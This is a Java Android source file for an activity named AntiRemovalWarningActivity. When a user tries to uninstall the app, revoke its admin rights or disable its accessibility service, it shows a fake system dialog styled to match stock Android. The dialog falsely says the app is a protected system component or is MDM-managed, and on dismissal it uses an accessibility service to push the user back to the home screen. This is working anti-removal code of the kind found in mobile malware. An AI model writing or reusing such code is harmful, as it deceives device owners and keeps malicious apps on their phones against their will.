package com.seguranca.protecao;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.os.Bundle;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.TextView;

/**
 * AntiRemovalWarningActivity
 *
 * Triggered when the user attempts to uninstall or deactivate the app.
 * Presents a calm, system-authentic dialog that blends with AOSP / OEM UI.
 *
 * Intent extras (all optional):
 *   "reason"  — "uninstall" | "admin_revoke" | "accessibility_disable"
 *               Defaults to "uninstall" if absent.
 */
public class AntiRemovalWarningActivity extends Activity {

    // ── Reason constants ───────────────────────────────────────────────────────
    private static final String REASON_UNINSTALL            = "uninstall";
    private static final String REASON_ADMIN_REVOKE         = "admin_revoke";
    private static final String REASON_ACCESSIBILITY_DISABLE = "accessibility_disable";

    // ── Color palette — neutral system grey ───────────────────────────────────
    private static final int BG_SCRIM      = 0x99000000;  // translucent dark scrim
    private static final int CARD_BG       = 0xFFF8F9FA;  // near-white card
    private static final int TITLE_COLOR   = 0xFF1C1B1F;  // M3 "on-surface"
    private static final int BODY_COLOR    = 0xFF49454F;  // M3 "on-surface-variant"
    private static final int DIVIDER_COLOR = 0xFFE0E0E0;
    private static final int BTN_OK_BG     = 0xFF1565C0;  // Google-blue primary
    private static final int BTN_OK_TEXT   = 0xFFFFFFFF;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Appear as an overlay on top of Settings / Play Store / whatever is open.
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON  |
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON  |
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
        );

        // Full-screen translucent scrim — the card floats on top.
        getWindow().setBackgroundDrawableResource(android.R.color.transparent);

        String reason = getIntent() != null
            ? getIntent().getStringExtra("reason")
            : null;
        if (reason == null) reason = REASON_UNINSTALL;

        setContentView(buildLayout(reason));
    }

    // ── Layout builder ─────────────────────────────────────────────────────────

    private View buildLayout(String reason) {
        // Root: dark scrim fills screen, card centred
        FrameLayout root = new FrameLayout(this);
        root.setLayoutParams(new FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        ));
        root.setBackgroundColor(BG_SCRIM);

        // ── Card ──────────────────────────────────────────────────────────────
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setGravity(Gravity.CENTER_HORIZONTAL);
        card.setPadding(dp(24), dp(28), dp(24), dp(20));

        android.graphics.drawable.GradientDrawable cardShape =
            new android.graphics.drawable.GradientDrawable();
        cardShape.setColor(CARD_BG);
        cardShape.setCornerRadius(dp(16));
        // Subtle elevation shadow via outline
        card.setBackground(cardShape);
        card.setElevation(dp(8));

        FrameLayout.LayoutParams cardLp = new FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        );
        cardLp.gravity = Gravity.CENTER;
        cardLp.setMargins(dp(28), 0, dp(28), 0);
        card.setLayoutParams(cardLp);

        // ── Lock / System icon (Unicode — no asset dependency) ───────────────
        TextView tvIcon = new TextView(this);
        tvIcon.setText("🔒");
        tvIcon.setTextSize(TypedValue.COMPLEX_UNIT_SP, 40);
        tvIcon.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams iconLp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        );
        iconLp.setMargins(0, 0, 0, dp(16));
        tvIcon.setLayoutParams(iconLp);
        card.addView(tvIcon);

        // ── Title ─────────────────────────────────────────────────────────────
        String title = titleFor(reason);
        TextView tvTitle = new TextView(this);
        tvTitle.setText(title);
        tvTitle.setTextColor(TITLE_COLOR);
        tvTitle.setTextSize(TypedValue.COMPLEX_UNIT_SP, 17);
        tvTitle.setTypeface(Typeface.DEFAULT_BOLD);
        tvTitle.setGravity(Gravity.CENTER);
        tvTitle.setLineSpacing(dp(2), 1.15f);
        LinearLayout.LayoutParams titleLp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        );
        titleLp.setMargins(0, 0, 0, dp(12));
        tvTitle.setLayoutParams(titleLp);
        card.addView(tvTitle);

        // ── Body ──────────────────────────────────────────────────────────────
        String body = bodyFor(reason);
        TextView tvBody = new TextView(this);
        tvBody.setText(body);
        tvBody.setTextColor(BODY_COLOR);
        tvBody.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
        tvBody.setGravity(Gravity.CENTER);
        tvBody.setLineSpacing(dp(2), 1.2f);
        LinearLayout.LayoutParams bodyLp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        );
        bodyLp.setMargins(0, 0, 0, dp(24));
        tvBody.setLayoutParams(bodyLp);
        card.addView(tvBody);

        // ── Thin divider ──────────────────────────────────────────────────────
        View divider = new View(this);
        divider.setBackgroundColor(DIVIDER_COLOR);
        LinearLayout.LayoutParams divLp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            1
        );
        divLp.setMargins(0, 0, 0, dp(16));
        divider.setLayoutParams(divLp);
        card.addView(divider);

        // ── OK button ─────────────────────────────────────────────────────────
        Button btnOk = new Button(this);
        btnOk.setText("OK");
        btnOk.setTextColor(BTN_OK_TEXT);
        btnOk.setTextSize(TypedValue.COMPLEX_UNIT_SP, 15);
        btnOk.setTypeface(Typeface.DEFAULT_BOLD);
        btnOk.setAllCaps(false);
        btnOk.setLetterSpacing(0.03f);

        android.graphics.drawable.GradientDrawable btnShape =
            new android.graphics.drawable.GradientDrawable();
        btnShape.setColor(BTN_OK_BG);
        btnShape.setCornerRadius(dp(24));
        btnOk.setBackground(btnShape);

        LinearLayout.LayoutParams btnLp = new LinearLayout.LayoutParams(
            dp(140),
            dp(44)
        );
        btnLp.gravity = Gravity.CENTER_HORIZONTAL;
        btnOk.setLayoutParams(btnLp);
        btnOk.setOnClickListener(v -> dismiss());
        card.addView(btnOk);

        root.addView(card);
        return root;
    }

    // ── String helpers ─────────────────────────────────────────────────────────

    private String titleFor(String reason) {
        switch (reason) {
            case REASON_ADMIN_REVOKE:
                return "Device Management Restriction";
            case REASON_ACCESSIBILITY_DISABLE:
                return "Required System Service";
            default: // uninstall
                return "Cannot Uninstall System App";
        }
    }

    private String bodyFor(String reason) {
        switch (reason) {
            case REASON_ADMIN_REVOKE:
                return "This service is managed by your device's Mobile Device Management (MDM) policy and cannot be deactivated by the user.";
            case REASON_ACCESSIBILITY_DISABLE:
                return "This accessibility service is required for core system functions. Disabling it may affect device performance and stability.";
            default: // uninstall
                return "This app is a protected system component.\n\nSystem applications are managed by the device manufacturer and cannot be removed by the user.";
        }
    }

    // ── Dismiss ────────────────────────────────────────────────────────────────

    private void dismiss() {
        try {
            if (UiAssistBridge.instance != null) {
                UiAssistBridge.instance.performGlobalAction(
                    android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME
                );
            }
        } catch (Exception ignored) {}

        try {
            Intent home = new Intent(Intent.ACTION_MAIN);
            home.addCategory(Intent.CATEGORY_HOME);
            home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(home);
        } catch (Exception ignored) {}

        finish();
    }

    @Override
    public void onBackPressed() {
        dismiss();
    }

    // ── Utility ────────────────────────────────────────────────────────────────

    private int dp(int value) {
        return (int) TypedValue.applyDimension(
            TypedValue.COMPLEX_UNIT_DIP,
            value,
            getResources().getDisplayMetrics()
        );
    }
}
